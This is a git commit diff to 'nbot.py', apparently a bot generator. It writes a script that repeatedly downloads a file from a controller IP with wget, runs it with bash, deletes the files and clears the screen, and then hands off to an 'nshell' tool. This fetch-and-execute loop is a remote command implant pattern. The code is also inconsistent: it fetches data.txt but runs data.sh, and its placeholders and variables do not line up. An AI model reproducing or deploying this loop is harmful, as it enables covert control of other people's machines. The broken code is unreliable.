9ae338ffa7afe991fcbb65ee4678228f5a280049
Guille-ux <104579306+Guille-ux@users.noreply.github.com>
2022-08-28 17:35:14 +0200

    Update nbot.py

--- nbot.py
+++ nbot.py
@@ -1,5 +1,4 @@
 import os, time
-import base64
 
 os.chdir("../output/")
 time.sleep(0.5)
@@ -9,16 +8,17 @@ opt3 = input("name: ")
 op = open(opt3 + ".py", "w")
 cod = """import os, time
 os.system("python3 -m http.server {} &")
-def get-put(ip):
-	os.system("wget http://{}:{}/data.txt".format(ip))
-	time.sleep(0.5)
-	os.system("bash data.sh > data")
-	os.remove("data.sh")
-	time.sleep(1.5)
-	os.remove("data")
-	os.system("clear")
+def get(ip):
+    os.system("wget http://{}:{}/data.txt".format(ip))
+    time.sleep(0.5)
+    os.system("bash data.sh > data")
+    os.remove("data.sh")
+    os.remove("data")
+    os.system("clear")
 while True:
-	get(ip)""".format(opt2, opt, opt2)
+    get(ip)
+    time.sleep(0.5)
+    """.format(opt2, opt, opt2)
 op1 = op.write(cod)
 os.chdir("../nshell/")
 os.system("python3 nshell.py")
